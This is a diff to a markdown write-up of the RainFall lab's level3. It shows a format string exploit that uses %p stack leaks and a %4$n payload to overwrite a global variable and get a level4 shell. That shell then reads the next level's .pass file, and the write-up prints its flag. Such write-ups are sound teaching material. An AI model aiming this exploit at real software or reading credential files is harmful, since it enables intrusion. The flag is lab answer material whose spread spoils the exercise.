@@ -35,11 +35,23 @@ Thus, we need to somehow modify the variable m. It is not defined in the scope o
 We use **gdb**'s "info variables" to get its memaddress: **0x0804988c**
 
 ## Format string attack
-**print() can be utilized for **format string attack** as described [HERE](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/). We will force the insertion of value 64 into the **m** variable memory position by using printf's variadic nature.
+**printf()** can be utilized for **format string attack** as described [HERE](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/). We will force the insertion of value 64 into the **m** variable memory position by using printf's variadic nature.
+
 **Step 1**: we find where in the stack is the variable read by fgets - this will be our way in. We do this by explouting printf to print us the memory:
 ~~~shell
 level3@RainFall:~$ python -c 'print "AAAA" + " %p" * 10' | ./level3
 AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
 ~~~
 **0x41414141** is our "AAAA" input - AAAA is 41414141 in hex.
-**Step 2**:
+
+**Step 2**: We will craft the payload using **%[number]$n** formatter to precisely target the memory position. Variable m needs to be 64 bytes. Its memory address has four, so we add 60 bytes of stuff + the modifier. Like so:
+~~~Shell
+level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
+level3@RainFall:~$ cat /tmp/exploit - | ./level3
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+~~~
